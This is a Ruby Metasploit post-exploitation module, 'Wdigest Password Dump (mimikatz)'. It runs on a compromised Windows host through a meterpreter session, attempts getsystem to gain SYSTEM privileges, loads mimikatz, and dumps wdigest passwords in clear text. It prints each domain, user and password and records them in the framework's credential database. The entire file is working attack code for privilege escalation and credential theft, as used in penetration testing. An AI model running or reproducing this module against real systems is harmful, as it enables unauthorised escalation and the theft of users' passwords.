##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'             => "Wdigest Password Dump (mimikatz)",
      'Description'      => %q{
          This module will attempt to dump all passwords in clear text on the machine using mimikatz.  
          The module will first check if sufficient privileges are present for
          certain actions, and run getsystem for system if needed.  If no sufficient
          privileges are available, the script will not continue.
        },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['James Cook | @b00stfr3ak44']
    ))
    register_options(
      [
        OptBool.new('GETSYSTEM', [ true, 'Attempt to get SYSTEM privilege on the target host.', true])
      ], self.class)
  end

  def get_system
    print_status("Trying to get SYSTEM privilege")
    results = session.priv.getsystem
    if results[0]
      print_status("Got SYSTEM privilege")
    else
      print_error("Could not obtain SYSTEM privileges")
    end
  end

  def priv_check
    if is_system?
      return true
    elsif is_admin?
      return true
    else
      return false
    end
  end

  def database_load(user_name,password)
	  report_auth_info(
		      :post => session.session_host,
          :port => 445,
					:sname => 'smb',
					:proto => 'tcp',
					:source_type => "exploit",
					:user => user_name,
					:pass => password,
			)
    rescue => e
      puts e
  end

  def run
    bad_accounts = [ 'IIS APPPOOL', 'NT AUTHORITY' ]
    get_system if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM']) 
    if not priv_check
      print_error("Abort! Did not pass the priv check")
      return
    end
    if(session.mimikatz)
      print_status('Mimikatz already loaded')
    else
      print_status('Trying to load Mimikatz')
      session.core.use('mimikatz')
    end
    if(session.mimikatz)
      print_good('Mimikatz Loaded!')
    else
      print_error("Faild to load mimikatz on #{session.sid} / #{session.session_host}")
      return
    end
    print_status('Dumping Passwords')
    session.mimikatz.wdigest.map.each do |account|
      if not account[:user].empty? and not bad_accounts.include?(account[:domain]) and not account[:user].end_with?('$')
        user_pass = "#{account[:domain]}\\#{account[:user]} #{account[:password]}"
        print_good(user_pass)
        database_load( "#{account[:domain]}\\#{account[:user]}" , account[:password] )
      end
    end
  end
end
